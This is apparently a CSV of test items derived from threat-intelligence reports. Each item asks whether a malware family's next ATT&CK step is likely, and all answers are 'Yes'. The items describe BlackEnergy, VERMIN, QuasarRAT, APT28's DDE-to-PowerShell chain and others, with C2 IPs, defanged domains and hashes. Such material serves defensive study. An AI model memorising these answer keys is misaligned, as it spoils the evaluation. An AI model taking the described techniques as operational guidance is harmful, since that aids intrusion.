1838,33,33-Command and Control-T1001-Data Obfuscation,"After BlackEnergy malware is activated to assess if the infected computer is the intended target and deploys a regular BlackEnergy variant with XML configuration data containing a list of C&C servers and unique build_id, is it likely that it will communicate with C&C servers before using the KillDisk component to overwrite data and sabotage processes on industrial control systems?","Command and Control: The BlackEnergy malware communicates with C&C servers using the following IP addresses: 5.149.254.114, 5.9.32.230, 31.210.111.154, 88.198.25.92, 146.0.74.7, and 88.40.8.72.","Execution: The BlackEnergy malware, active since 2007 and resurfaced in 2014, was used in 2015 to deliver a destructive KillDisk component in attacks against Ukrainian news media and the electric industry. The malware variants, once activated, allow operators to assess if the infected computer is the intended target, and if so, deploy a regular BlackEnergy variant. The malware stores XML configuration data within the DLL payload, containing a list of C&C servers and a unique build_id to identify infections or attempts.
Impact: The KillDisk component of BlackEnergy was used to damage data on computers, overwriting documents with random data and making the OS unbootable. The first known case was documented by CERT-UA in November 2015, where news media companies were attacked, resulting in the destruction of video materials and documents. The KillDisk variant used against energy companies in Ukraine had additional functionality intended to sabotage industrial systems, including terminating and corrupting specific processes related to industrial control systems (ICS).
Others: A previously unknown SSH backdoor, SSHBearDoor, was discovered, which allowed the BlackEnergy group to access infected systems in addition to the BlackEnergy malware. The backdoored SSH server, Dropbear SSH, contained hardcoded credentials and a pre-defined public key for authentication. ESET security solutions detect this threat as Win32/SSHBearDoor.A trojan.",Yes,blackenergy-sshbeardoor-details-2015-attacks-ukrainian-news-media-electric-industry
1843,330,330-Command and Control-T1571-Non-Standard Port,"After the TAIDOOR loader decrypts and executes the RAT files in memory for execution, is it likely that the malware will establish command and control by connecting to C2 servers using the identified domains and IP address?","Command and Control: The TAIDOOR malware establishes command and control by connecting to C2 servers after execution. The report identifies two domains (cnaweb.mrslove.com and infonew.dubya.net) and one IP address (210.68.69.82) associated with the C2 infrastructure. The malware communicates over port 443 TCP, but the initial packet sent does not follow TLS protocol and is easily identifiable. The report includes WHOIS information for the domains and details the communication process between the RAT and the C2 servers.","Execution: The CTI report from CISA, FBI, and DoD on September 25, 2020, details the analysis of a Remote Access Trojan (RAT) known as TAIDOOR, used by Chinese government cyber actors. The malware is installed as a service DLL and consists of two files: a loader and an encrypted second file which is the main RAT. The loader, upon execution, decrypts and runs the RAT in memory. The report includes the submission of four files, two of which are identified as loaders (ml.dll and rasautoex.dll) and two as versions of the TAIDOOR RAT (svchost.dll). The loaders decrypt and execute the RAT files, which then attempt to connect to command-and-control (C2) servers. The report provides detailed technical information, including file hashes, antivirus detections, and YARA rules for detection.
Others: The report provides mitigation strategies, including maintaining up-to-date antivirus signatures, keeping operating systems patched, disabling unnecessary services, and enforcing strong password policies. It also includes Snort rules for detecting malicious traffic associated with the malware and recommends maintaining situational awareness of the latest threats. Additionally, the report contains contact information for CISA and instructions for submitting malware samples or reporting suspicious activity.",Yes,MAR-10292089-1.v2 – Chinese Remote Access Trojan_ TAIDOOR _ CISA
1849,331,331-Collection-T1056-Input Capture,"After VERMIN malware collects system information, such as machine name, username, and local IP address using WMI queries, is it likely that the keylogger component will collect keystrokes and clipboard data and store them encrypted in a folder under %appdata%\Microsoft\Proof\Settings?","Collection: The VERMIN malware includes a keylogger component that collects all keystrokes and clipboard data. The data is encrypted and stored in the folder %appdata%\Microsoft\Proof\Settings.{ED7BA470-8E54-465E-825C-99712043E01C}\Profiles\. Each file is saved with the format ""{0:dd-MM-yyyy}.txt"" and encrypted using 3-DES with a hardcoded key.","Initial Access: The CTI report by Tom Lancaster and Juan Cortes from Palo Alto Networks' Unit 42 details the discovery of a new malware family named VERMIN, which is a Remote Access Tool (RAT) written using the Microsoft .NET Framework. The malware was initially identified through a tweet about a sample with a Ukrainian Ministry of Defense theme. The sample was an SFX executable that displayed a decoy document before executing the malware. The hash of the file is 31a1419d9121f55859ecf2d01f07da38bd37bb11d0ed9544a35d5d69472c358e. The malware uses HTTP encapsulated SOAP for command and control, which is uncommon in malware samples. The campaign using VERMIN dates back to late 2015 and also involves the use of Quasar RAT.
Execution: The VERMIN malware, after initial execution, checks the installed input language on the system for Russian or Ukrainian. If neither is found, it attempts to exit but continues to run due to a coding error. It then decrypts an embedded resource using a brute force method to find a 6-byte array that matches a CRC32 sum, which is then hashed with MD5 to create a decryption key. The malware sets up a scheduled task to run every 30 minutes indefinitely and collects various information from the infected machine, such as machine name, username, OS name, architecture, local IP address, and installed anti-virus software. If any anti-virus is detected, the malware does not install its keylogger component.
Persistence: The VERMIN malware establishes persistence by setting itself to run as a scheduled task every 30 minutes indefinitely. The task is created with various parameters, including server IP list, path, keylogger path, mutex, username, password, task names, process names, task descriptions, and task authors. The malware saves and encrypts these parameters to a predefined location on the infected system: C:\Users\Admin\AppData\Roaming\Microsoft\AddIns\settings.dat.
Defense Evasion: The VERMIN malware uses the popular .NET obfuscation tool ConfuserEx to pack and obfuscate its code. It also checks for the presence of anti-virus software on the infected machine and refrains from installing its keylogger component if any anti-virus is detected.
Discovery: The VERMIN malware collects various information from the infected machine, including machine name, username, OS name via WMI query, architecture (x64 vs x86), local IP address, and checks for installed anti-virus software via WMI query.
Command and Control: The VERMIN malware communicates with its command and control (C2) servers using SOAP envelopes and the WSHttpBinding() API. It sets up 'Username' authentication for communication with its C2, allowing the author easier control over the various infected hosts. An example of a defanged request/response to the C2 server is provided in the report.
Others: The CTI report concludes that the VERMIN malware is likely used in targeted attacks in Ukraine, given the limited number of samples, targeting themes, and the requirement for most of the malware's operations to have ""hands-on-keyboard"" interactions, except for keylogging. The report also mentions that Palo Alto Networks' Wildfire and Traps identify all samples mentioned as malicious, and the C2 domains used in the campaign are blocked via Threat Prevention. AutoFocus customers can track samples related to the blog via specific tags. The report includes appendices with C2 addresses, malware samples, and a Python script to decode VERMIN resources.",Yes,VERMIN_ Quasar RAT and Custom Malware Used In Ukraine
1850,331,331-Collection-T1115-Clipboard Data,"After executing the decoy SFX executable that deploys the VERMIN malware and gaining persistence by configuring itself as a scheduled task to run every 30 minutes, is it likely that the malware will activate its keylogger component to collect keystrokes and clipboard data before communicating with its command and control (C2) servers using the WSHttpBinding() API?","Collection: The VERMIN malware includes a keylogger component that collects all keystrokes and clipboard data. The data is encrypted and stored in the folder %appdata%\Microsoft\Proof\Settings.{ED7BA470-8E54-465E-825C-99712043E01C}\Profiles\. Each file is saved with the format ""{0:dd-MM-yyyy}.txt"" and encrypted using 3-DES with a hardcoded key.","Initial Access: The CTI report by Tom Lancaster and Juan Cortes from Palo Alto Networks' Unit 42 details the discovery of a new malware family named VERMIN, which is a Remote Access Tool (RAT) written using the Microsoft .NET Framework. The malware was initially identified through a tweet about a sample with a Ukrainian Ministry of Defense theme. The sample was an SFX executable that displayed a decoy document before executing the malware. The hash of the file is 31a1419d9121f55859ecf2d01f07da38bd37bb11d0ed9544a35d5d69472c358e. The malware uses HTTP encapsulated SOAP for command and control, which is uncommon in malware samples. The campaign using VERMIN dates back to late 2015 and also involves the use of Quasar RAT.
Execution: The VERMIN malware, after initial execution, checks the installed input language on the system for Russian or Ukrainian. If neither is found, it attempts to exit but continues to run due to a coding error. It then decrypts an embedded resource using a brute force method to find a 6-byte array that matches a CRC32 sum, which is then hashed with MD5 to create a decryption key. The malware sets up a scheduled task to run every 30 minutes indefinitely and collects various information from the infected machine, such as machine name, username, OS name, architecture, local IP address, and installed anti-virus software. If any anti-virus is detected, the malware does not install its keylogger component.
Persistence: The VERMIN malware establishes persistence by setting itself to run as a scheduled task every 30 minutes indefinitely. The task is created with various parameters, including server IP list, path, keylogger path, mutex, username, password, task names, process names, task descriptions, and task authors. The malware saves and encrypts these parameters to a predefined location on the infected system: C:\Users\Admin\AppData\Roaming\Microsoft\AddIns\settings.dat.
Defense Evasion: The VERMIN malware uses the popular .NET obfuscation tool ConfuserEx to pack and obfuscate its code. It also checks for the presence of anti-virus software on the infected machine and refrains from installing its keylogger component if any anti-virus is detected.
Discovery: The VERMIN malware collects various information from the infected machine, including machine name, username, OS name via WMI query, architecture (x64 vs x86), local IP address, and checks for installed anti-virus software via WMI query.
Command and Control: The VERMIN malware communicates with its command and control (C2) servers using SOAP envelopes and the WSHttpBinding() API. It sets up 'Username' authentication for communication with its C2, allowing the author easier control over the various infected hosts. An example of a defanged request/response to the C2 server is provided in the report.
Others: The CTI report concludes that the VERMIN malware is likely used in targeted attacks in Ukraine, given the limited number of samples, targeting themes, and the requirement for most of the malware's operations to have ""hands-on-keyboard"" interactions, except for keylogging. The report also mentions that Palo Alto Networks' Wildfire and Traps identify all samples mentioned as malicious, and the C2 domains used in the campaign are blocked via Threat Prevention. AutoFocus customers can track samples related to the blog via specific tags. The report includes appendices with C2 addresses, malware samples, and a Python script to decode VERMIN resources.",Yes,VERMIN_ Quasar RAT and Custom Malware Used In Ukraine
1853,331,331-Discovery-T1518-Software Discovery,"After executing a decoy document to perform initial access using an SFX executable themed around the Ukrainian Ministry of Defense, is the VERMIN malware likely to decrypt an embedded resource using a brute force method to establish execution behavior before collecting OS name via WMI query as part of its discovery activities?","Discovery: The VERMIN malware collects various information from the infected machine, including machine name, username, OS name via WMI query, architecture (x64 vs x86), local IP address, and checks for installed anti-virus software via WMI query.","Initial Access: The CTI report by Tom Lancaster and Juan Cortes from Palo Alto Networks' Unit 42 details the discovery of a new malware family named VERMIN, which is a Remote Access Tool (RAT) written using the Microsoft .NET Framework. The malware was initially identified through a tweet about a sample with a Ukrainian Ministry of Defense theme. The sample was an SFX executable that displayed a decoy document before executing the malware. The hash of the file is 31a1419d9121f55859ecf2d01f07da38bd37bb11d0ed9544a35d5d69472c358e. The malware uses HTTP encapsulated SOAP for command and control, which is uncommon in malware samples. The campaign using VERMIN dates back to late 2015 and also involves the use of Quasar RAT.
Execution: The VERMIN malware, after initial execution, checks the installed input language on the system for Russian or Ukrainian. If neither is found, it attempts to exit but continues to run due to a coding error. It then decrypts an embedded resource using a brute force method to find a 6-byte array that matches a CRC32 sum, which is then hashed with MD5 to create a decryption key. The malware sets up a scheduled task to run every 30 minutes indefinitely and collects various information from the infected machine, such as machine name, username, OS name, architecture, local IP address, and installed anti-virus software. If any anti-virus is detected, the malware does not install its keylogger component.
Persistence: The VERMIN malware establishes persistence by setting itself to run as a scheduled task every 30 minutes indefinitely. The task is created with various parameters, including server IP list, path, keylogger path, mutex, username, password, task names, process names, task descriptions, and task authors. The malware saves and encrypts these parameters to a predefined location on the infected system: C:\Users\Admin\AppData\Roaming\Microsoft\AddIns\settings.dat.
Defense Evasion: The VERMIN malware uses the popular .NET obfuscation tool ConfuserEx to pack and obfuscate its code. It also checks for the presence of anti-virus software on the infected machine and refrains from installing its keylogger component if any anti-virus is detected.
Collection: The VERMIN malware includes a keylogger component that collects all keystrokes and clipboard data. The data is encrypted and stored in the folder %appdata%\Microsoft\Proof\Settings.{ED7BA470-8E54-465E-825C-99712043E01C}\Profiles\. Each file is saved with the format ""{0:dd-MM-yyyy}.txt"" and encrypted using 3-DES with a hardcoded key.
Command and Control: The VERMIN malware communicates with its command and control (C2) servers using SOAP envelopes and the WSHttpBinding() API. It sets up 'Username' authentication for communication with its C2, allowing the author easier control over the various infected hosts. An example of a defanged request/response to the C2 server is provided in the report.
Others: The CTI report concludes that the VERMIN malware is likely used in targeted attacks in Ukraine, given the limited number of samples, targeting themes, and the requirement for most of the malware's operations to have ""hands-on-keyboard"" interactions, except for keylogging. The report also mentions that Palo Alto Networks' Wildfire and Traps identify all samples mentioned as malicious, and the C2 domains used in the campaign are blocked via Threat Prevention. AutoFocus customers can track samples related to the blog via specific tags. The report includes appendices with C2 addresses, malware samples, and a Python script to decode VERMIN resources.",Yes,VERMIN_ Quasar RAT and Custom Malware Used In Ukraine
1855,332,332-Execution-T1129-Shared Modules,"After the QuasarRAT backdoor achieves persistence by installing itself as a service under the name DILLJUICE in later variants, is it likely that the loader will utilize the CppHostCLR technique to decrypt, load, and invoke an embedded .NET assembly in-memory for execution?","Execution: During the latter half of 2018, BlackBerry Cylance threat researchers tracked a campaign targeting companies across the EMEA region. The campaign was related to the MenuPass threat actor, which utilized an open-source backdoor named QuasarRAT to achieve persistence within organizations. The QuasarRAT loader typically arrives as a 64-bit service DLL, using the CppHostCLR technique to decrypt, load, and invoke an embedded .NET assembly in-memory. The assembly is obfuscated with ConfuserEx and is responsible for decrypting and executing a separate malicious .NET module stored in the %WINDOWS%\Microsoft.NET directory. The final payload assembly is stored as an encrypted file under the Microsoft.NET Framework directory and is decrypted and loaded in-memory as ""Client"". Two versions of the Client were encountered: 2.0.0.0 and 1.3.0.0.","Persistence: The QuasarRAT backdoor achieves persistence by installing the RAT as a service, known as DILLJUICE, in later variants. The encrypted QuasarRAT payload is stored in the Microsoft.NET directory, decrypted into memory, and instantiated using a CLR host application.
Defense Evasion: The QuasarRAT loader uses several layers of obfuscation and encryption to evade detection. The payload and its immediate loader are .NET assemblies, with the initial loader using the CppHostCLR technique to inject and execute the .NET loader assembly. The payload is encrypted and stored under the Microsoft.NET directory. The .NET loader is obfuscated with ConfuserEx v1.0.0. Some samples of the loader are signed with a valid certificate from CONVENTION DIGITAL LTD, which is countersigned by Symantec.
Command and Control: The QuasarRAT backdoor communicates with a command and control (C2) server, with the IP address provided in the HOSTS value of the configuration. All communication is encrypted with AES-128 in CBF mode using KEY and AUTHKEY values from the configuration.
Others: The MenuPass campaign was tracked by BlackBerry Cylance threat researchers during the latter half of 2018, targeting companies from several verticals across the EMEA region. The campaign utilized QuasarRAT, a lightweight remote administration tool written in C#, to collect system information, download and execute applications, upload files, log keystrokes, grab screenshots/camera captures, retrieve system passwords, and run shell commands. The FBI indicted several members of the MenuPass group around the time when new QuasarRAT samples ceased to be observed in the wild. The threat actor modified the original QuasarRAT backdoor, adding their own field in the configuration, and code for checking Internet connectivity. If a valid URL address is specified in the last value of the configuration, the malware will try to download the content of that URL and proceed with connecting to the C2 server only once the download is successful. The threat actor also added a custom connectivity check to the backdoor. The YARA rules provided can be used to identify QuasarRAT loaders and possible high-entropy payloads stored within the %WINDOWS%\Microsoft.NET\Framework folder.",Yes,Threat Spotlight_ MenuPass_QuasarRAT Backdoor
1860,332,332-Command and Control-T1573-Encrypted Channel,"After using several layers of obfuscation and encryption to evade detection through techniques such as CppHostCLR and ConfuserEx, is it likely that QuasarRAT will communicate with a command and control (C2) server using AES-128 encrypted channels as specified in its configuration?","Command and Control: The QuasarRAT backdoor communicates with a command and control (C2) server, with the IP address provided in the HOSTS value of the configuration. All communication is encrypted with AES-128 in CBF mode using KEY and AUTHKEY values from the configuration.","Execution: During the latter half of 2018, BlackBerry Cylance threat researchers tracked a campaign targeting companies across the EMEA region. The campaign was related to the MenuPass threat actor, which utilized an open-source backdoor named QuasarRAT to achieve persistence within organizations. The QuasarRAT loader typically arrives as a 64-bit service DLL, using the CppHostCLR technique to decrypt, load, and invoke an embedded .NET assembly in-memory. The assembly is obfuscated with ConfuserEx and is responsible for decrypting and executing a separate malicious .NET module stored in the %WINDOWS%\Microsoft.NET directory. The final payload assembly is stored as an encrypted file under the Microsoft.NET Framework directory and is decrypted and loaded in-memory as ""Client"". Two versions of the Client were encountered: 2.0.0.0 and 1.3.0.0.
Persistence: The QuasarRAT backdoor achieves persistence by installing the RAT as a service, known as DILLJUICE, in later variants. The encrypted QuasarRAT payload is stored in the Microsoft.NET directory, decrypted into memory, and instantiated using a CLR host application.
Defense Evasion: The QuasarRAT loader uses several layers of obfuscation and encryption to evade detection. The payload and its immediate loader are .NET assemblies, with the initial loader using the CppHostCLR technique to inject and execute the .NET loader assembly. The payload is encrypted and stored under the Microsoft.NET directory. The .NET loader is obfuscated with ConfuserEx v1.0.0. Some samples of the loader are signed with a valid certificate from CONVENTION DIGITAL LTD, which is countersigned by Symantec.
Others: The MenuPass campaign was tracked by BlackBerry Cylance threat researchers during the latter half of 2018, targeting companies from several verticals across the EMEA region. The campaign utilized QuasarRAT, a lightweight remote administration tool written in C#, to collect system information, download and execute applications, upload files, log keystrokes, grab screenshots/camera captures, retrieve system passwords, and run shell commands. The FBI indicted several members of the MenuPass group around the time when new QuasarRAT samples ceased to be observed in the wild. The threat actor modified the original QuasarRAT backdoor, adding their own field in the configuration, and code for checking Internet connectivity. If a valid URL address is specified in the last value of the configuration, the malware will try to download the content of that URL and proceed with connecting to the C2 server only once the download is successful. The threat actor also added a custom connectivity check to the backdoor. The YARA rules provided can be used to identify QuasarRAT loaders and possible high-entropy payloads stored within the %WINDOWS%\Microsoft.NET\Framework folder.",Yes,Threat Spotlight_ MenuPass_QuasarRAT Backdoor
1862,333,333-Credential Access-T1606-Forge Web Credentials,"After UNC1151 registers credential theft domains that spoof legitimate websites to steal victim credentials for gaining initial access, is it likely that these credential harvesting domains will spoof legitimate webmail providers, generic login pages, and legitimate websites, sending them to victims for achieving credential access?","Credential Access: UNC1151 has used credential harvesting domains to spoof legitimate webmail providers, generic login pages, and the legitimate websites of their targets. These domains are sent to victims via phishing emails. The group has improved its technical skills over time, shifting from using Freenom to Cloudflare services, possibly indicating increased resources. UNC1151 has used a proprietary suite of malware, including HIDDENVALUE and HALFSHELL, and has infrequently been observed using open source or publicly available tools. They have yet to be seen conducting post-compromise activity.","Initial Access: Since at least 2016, UNC1151 has registered credential theft domains that spoof legitimate websites to steal victim credentials. The group has targeted a variety of entities, focusing on Eastern Europe, particularly Ukraine, Lithuania, Latvia, Poland, and Germany, as well as Belarusian dissidents, media, and journalists. UNC1151 has also conducted malware-based intrusions, with significant activities against Ukrainian government entities and some targeting of Lithuania and Poland. They have not targeted Russian or Belarusian state entities but have spear-phished intergovernmental organizations dealing with former-Soviet states.
Others: Mandiant Threat Intelligence assesses with high confidence that UNC1151 is linked to the Belarusian government and possibly the Belarusian military, based on technical and geopolitical indicators. The group's cyber espionage activities align with Belarusian government interests, focusing on obtaining confidential information without monetization efforts. UNC1151's operations have evolved with contiguous TTPs since 2017, suggesting the maturation of a single organization. Ghostwriter information operations, assessed to be supported by Belarus, have shifted focus since mid-2020 to align more closely with Belarusian interests, particularly following the disputed 2020 Belarusian elections. The operations have targeted narratives critical of NATO and neighboring governments, especially Lithuania and Poland. The sources of written content for Ghostwriter operations and the malware used by UNC1151 remain uncertain, with the possibility of involvement from additional organizations or countries. Mandiant has not found direct evidence of Russian government involvement in UNC1151 or Ghostwriter operations, despite some TTP overlaps and consistency with Russian goals.",Yes,UNC1151_Assessed-with-High-Confidence-to-have-Links-to-Belarus_Mandiant
1864,334,334-Impact-T1561-Disk Wipe,"After Implant.ARM.iLOBleed.a evades detection by modifying the firmware update process and preventing event logging of its operations, is it likely capable of wiping server disks as part of hiding tracks and potentially disrupting operations?","Impact: The rootkit is capable of wiping server disks completely, with the ability to perform this action repeatedly at intervals. This destructive capability is part of the malware's impact tactics, designed to hide tracks and potentially disrupt operations by destroying data on the server's hard disks.","Persistence: The report details the discovery of a rootkit named Implant.ARM.iLOBleed.a within HP iLO firmware. This rootkit is designed to maintain persistence by manipulating the iLO firmware upgrade routine, simulating version changes while preventing actual updates. The malware achieves persistence by disabling signature validation in both the operating system kernel and bootloader, allowing the infected firmware to load without issues after reboots.
Defense Evasion: Implant.ARM.iLOBleed.a evades detection by simulating firmware updates and displaying fake version information in the iLO web console. It modifies the firmware update process to maintain the infected firmware and alters admin web interface modules to display invalid software version information. Additionally, it modifies server event logging modules to prevent logging of its operations.
Others: The report emphasizes the importance of firmware security and the challenges posed by proprietary technologies like HP iLO, which lacks public tools and information for security analysis. It highlights the need for preventive security measures, such as updating firmware, changing admin passwords, isolating the iLO network, and periodically monitoring firmware status. The report also mentions the development of tools to dump iLO firmware and check for infections, which will be made available to the public.",Yes,Implant.ARM_.iLOBleed.a-en
1866,335,335-Command and Control-T1104-Multi-Stage Channels,"After using the Microsoft Office Dynamic Data Exchange (DDE) technique to invoke PowerShell and execute encoded commands, is it likely that the malicious document will contact a control server to distribute the first-stage Seduploader malware in a multi-stage command and control operation?","Command and Control: Once opened, the document contacts a control server to drop the first stage of the malware, Seduploader, onto a victim's system. The control server domain associated with this activity is webviewres[.]net, which is consistent with past APT28 domain registration techniques that spoof legitimate-sounding infrastructure.","Initial Access: During our monitoring of activities around the APT28 threat group, McAfee Advanced Threat Research analysts identified a malicious Word document that appears to leverage the Microsoft Office Dynamic Data Exchange (DDE) technique that has been previously reported by Advanced Threat Research. This document likely marks the first observed use of this technique by APT28. The use of DDE with PowerShell allows an attacker to execute arbitrary code on a victim's system regardless whether macros are enabled.
Execution: The document uses the recently detailed DDE technique found in Office products to invoke the command prompt to invoke PowerShell, which runs two commands. The first command is a PowerShell script that downloads a string from a URL, which is then executed as an encoded command. The second PowerShell command is Base64 encoded and is found in the version of config.txt received from the remote server. It downloads a file from a URL and creates a batch file and a registry entry to ensure persistence.
Persistence: The document creates a batch file and a registry entry to ensure persistence of the malware on the victim's system.
Defense Evasion: APT28 is known for rapidly incorporating new exploitation techniques to increase its success, such as moving away from using VBA scripts employed in past actions and choosing to incorporate the DDE technique to bypass network defenses.
Others: APT28 has recently focused on using different themes. In this case, it capitalized on the recent terrorist attack in New York City. The document itself is blank. The domain involved in the distribution of Seduploader was created on October 19, 11 days prior to the creation of Seduploader. The document downloads a version of the Seduploader first-stage reconnaissance implant, which profiles prospective victims, pulling basic host information from the infected system to the attackers. If the system is of interest, then the installation of X-Agent or Sedreco usually follows. We have observed APT28 using Seduploader as a first-stage payload for several years from various public reporting. Based on structural code analysis of recent payloads observed in the campaign, we see they are identical to previous Seduploader samples employed by APT28. The domain satellitedeluxpanorama[.]com, used by the implant secnt.dll, resolved to 89.34.111.160 as of November 5. The malicious document 68c2809560c7623d2307d8797691abf3eafe319a is responsible for dropping the Seduploader payload (secnt.dll). Its original file name was SaberGuardian2017.docx. This document was created on October 27. The document is distributed from hxxp://sendmevideo[.]org/SaberGuardian2017.docx. The document calls sendmevideo[.]org/dh2025e/eh.dll to download Seduploader(ab354807e687993fbeb1b325eb6e4ab38d428a1e). The file vms.dll, 4bc722a9b0492a50bd86a1341f02c74c0d773db7, is 99% similar-to secnt.dll ab354807e687993fbeb1b325eb6e4ab38d428a1e, indicating the code is almost identical and highly likely to be part of the same campaign. These two DLL implants are likely part of the same campaign. Furthermore, the sample 4bc722a9b0492a50bd86a1341f02c74c0d773db7, based on our code analysis, is 99% similar to the DLL implant 8a68f26d01372114f660e32ac4c9117e5d0577f1, which was used in a campaign spoofing the upcoming cyber conference Cy Con U.S. The attack techniques in the two campaigns differ: The campaign spoofing the Cy Con U.S conference used document files to execute a malicious VBA script; this campaign using the terrorist theme uses DDE within a document file to execute PowerShell and fetches a remote payload from a distribution site. The payloads, however, are identical for both campaigns.",Yes,Threat_Group_APT28_Slips_Office_Malware
1867,335,335-Execution-T1059-Command and Scripting Interpreter,"After leveraging the malicious Word document to gain initial access using the DDE technique, is it likely that the APT28 threat actor will use Command and Scripting Interpreter to invoke PowerShell commands to download a file and create persistence through a batch file and registry entry before connecting to a command and control server to drop the first-stage Seduploader malware?","Execution: The document uses the recently detailed DDE technique found in Office products to invoke the command prompt to invoke PowerShell, which runs two commands. The first command is a PowerShell script that downloads a string from a URL, which is then executed as an encoded command. The second PowerShell command is Base64 encoded and is found in the version of config.txt received from the remote server. It downloads a file from a URL and creates a batch file and a registry entry to ensure persistence.","Initial Access: During our monitoring of activities around the APT28 threat group, McAfee Advanced Threat Research analysts identified a malicious Word document that appears to leverage the Microsoft Office Dynamic Data Exchange (DDE) technique that has been previously reported by Advanced Threat Research. This document likely marks the first observed use of this technique by APT28. The use of DDE with PowerShell allows an attacker to execute arbitrary code on a victim's system regardless whether macros are enabled.
Persistence: The document creates a batch file and a registry entry to ensure persistence of the malware on the victim's system.
Defense Evasion: APT28 is known for rapidly incorporating new exploitation techniques to increase its success, such as moving away from using VBA scripts employed in past actions and choosing to incorporate the DDE technique to bypass network defenses.
Command and Control: Once opened, the document contacts a control server to drop the first stage of the malware, Seduploader, onto a victim's system. The control server domain associated with this activity is webviewres[.]net, which is consistent with past APT28 domain registration techniques that spoof legitimate-sounding infrastructure.
Others: APT28 has recently focused on using different themes. In this case, it capitalized on the recent terrorist attack in New York City. The document itself is blank. The domain involved in the distribution of Seduploader was created on October 19, 11 days prior to the creation of Seduploader. The document downloads a version of the Seduploader first-stage reconnaissance implant, which profiles prospective victims, pulling basic host information from the infected system to the attackers. If the system is of interest, then the installation of X-Agent or Sedreco usually follows. We have observed APT28 using Seduploader as a first-stage payload for several years from various public reporting. Based on structural code analysis of recent payloads observed in the campaign, we see they are identical to previous Seduploader samples employed by APT28. The domain satellitedeluxpanorama[.]com, used by the implant secnt.dll, resolved to 89.34.111.160 as of November 5. The malicious document 68c2809560c7623d2307d8797691abf3eafe319a is responsible for dropping the Seduploader payload (secnt.dll). Its original file name was SaberGuardian2017.docx. This document was created on October 27. The document is distributed from hxxp://sendmevideo[.]org/SaberGuardian2017.docx. The document calls sendmevideo[.]org/dh2025e/eh.dll to download Seduploader(ab354807e687993fbeb1b325eb6e4ab38d428a1e). The file vms.dll, 4bc722a9b0492a50bd86a1341f02c74c0d773db7, is 99% similar-to secnt.dll ab354807e687993fbeb1b325eb6e4ab38d428a1e, indicating the code is almost identical and highly likely to be part of the same campaign. These two DLL implants are likely part of the same campaign. Furthermore, the sample 4bc722a9b0492a50bd86a1341f02c74c0d773db7, based on our code analysis, is 99% similar to the DLL implant 8a68f26d01372114f660e32ac4c9117e5d0577f1, which was used in a campaign spoofing the upcoming cyber conference Cy Con U.S. The attack techniques in the two campaigns differ: The campaign spoofing the Cy Con U.S conference used document files to execute a malicious VBA script; this campaign using the terrorist theme uses DDE within a document file to execute PowerShell and fetches a remote payload from a distribution site. The payloads, however, are identical for both campaigns.",Yes,Threat_Group_APT28_Slips_Office_Malware
1868,335,335-Persistence-T1547-Boot or Logon Autostart Execution,"After APT28's malicious document leverages the Dynamic Data Exchange (DDE) technique via PowerShell to achieve execution by downloading and running encoded commands, is it likely to observe the document creating a batch file and a registry entry to ensure persistence of the malware on the victim's system?",Persistence: The document creates a batch file and a registry entry to ensure persistence of the malware on the victim's system.,"Initial Access: During our monitoring of activities around the APT28 threat group, McAfee Advanced Threat Research analysts identified a malicious Word document that appears to leverage the Microsoft Office Dynamic Data Exchange (DDE) technique that has been previously reported by Advanced Threat Research. This document likely marks the first observed use of this technique by APT28. The use of DDE with PowerShell allows an attacker to execute arbitrary code on a victim's system regardless whether macros are enabled.
Execution: The document uses the recently detailed DDE technique found in Office products to invoke the command prompt to invoke PowerShell, which runs two commands. The first command is a PowerShell script that downloads a string from a URL, which is then executed as an encoded command. The second PowerShell command is Base64 encoded and is found in the version of config.txt received from the remote server. It downloads a file from a URL and creates a batch file and a registry entry to ensure persistence.
Defense Evasion: APT28 is known for rapidly incorporating new exploitation techniques to increase its success, such as moving away from using VBA scripts employed in past actions and choosing to incorporate the DDE technique to bypass network defenses.
Command and Control: Once opened, the document contacts a control server to drop the first stage of the malware, Seduploader, onto a victim's system. The control server domain associated with this activity is webviewres[.]net, which is consistent with past APT28 domain registration techniques that spoof legitimate-sounding infrastructure.
Others: APT28 has recently focused on using different themes. In this case, it capitalized on the recent terrorist attack in New York City. The document itself is blank. The domain involved in the distribution of Seduploader was created on October 19, 11 days prior to the creation of Seduploader. The document downloads a version of the Seduploader first-stage reconnaissance implant, which profiles prospective victims, pulling basic host information from the infected system to the attackers. If the system is of interest, then the installation of X-Agent or Sedreco usually follows. We have observed APT28 using Seduploader as a first-stage payload for several years from various public reporting. Based on structural code analysis of recent payloads observed in the campaign, we see they are identical to previous Seduploader samples employed by APT28. The domain satellitedeluxpanorama[.]com, used by the implant secnt.dll, resolved to 89.34.111.160 as of November 5. The malicious document 68c2809560c7623d2307d8797691abf3eafe319a is responsible for dropping the Seduploader payload (secnt.dll). Its original file name was SaberGuardian2017.docx. This document was created on October 27. The document is distributed from hxxp://sendmevideo[.]org/SaberGuardian2017.docx. The document calls sendmevideo[.]org/dh2025e/eh.dll to download Seduploader(ab354807e687993fbeb1b325eb6e4ab38d428a1e). The file vms.dll, 4bc722a9b0492a50bd86a1341f02c74c0d773db7, is 99% similar-to secnt.dll ab354807e687993fbeb1b325eb6e4ab38d428a1e, indicating the code is almost identical and highly likely to be part of the same campaign. These two DLL implants are likely part of the same campaign. Furthermore, the sample 4bc722a9b0492a50bd86a1341f02c74c0d773db7, based on our code analysis, is 99% similar to the DLL implant 8a68f26d01372114f660e32ac4c9117e5d0577f1, which was used in a campaign spoofing the upcoming cyber conference Cy Con U.S. The attack techniques in the two campaigns differ: The campaign spoofing the Cy Con U.S conference used document files to execute a malicious VBA script; this campaign using the terrorist theme uses DDE within a document file to execute PowerShell and fetches a remote payload from a distribution site. The payloads, however, are identical for both campaigns.",Yes,Threat_Group_APT28_Slips_Office_Malware
1869,336,336-Initial Access-T1566-Phishing,"After the Scote malware provides backdoor access by collecting C2 information from Pastebin links and Google+ profiles, is it likely that the attackers used Arabic language decoy documents to entice victims as part of their phishing strategy during the initial access phase?","Initial Access: In the TopHat campaign, attackers used Arabic language decoy documents related to current events within the Palestine Territories to entice victims. The attacks were deployed via malicious RTF files, self-extracting Windows executables, and RAR archives. The RTF files made HTTP requests to a bit.ly URL, which redirected to a malicious site. The self-extracting executables loaded a decoy document and spawned an instance of Scote malware.","Execution: The Scote malware family, once executed, provides backdoor access for an attacker. It collects command and control (C2) information from Pastebin links and Google+ profiles. The bit.ly links obscured the C2 URLs, preventing victims from evaluating the legitimacy of the final site.
Defense Evasion: Scote malware employs various techniques to evade detection, including the use of legitimate third-party online services to host its C2 information. The malware uses a series of techniques and tricks when loaded onto a victim machine, including layers of obfuscation.
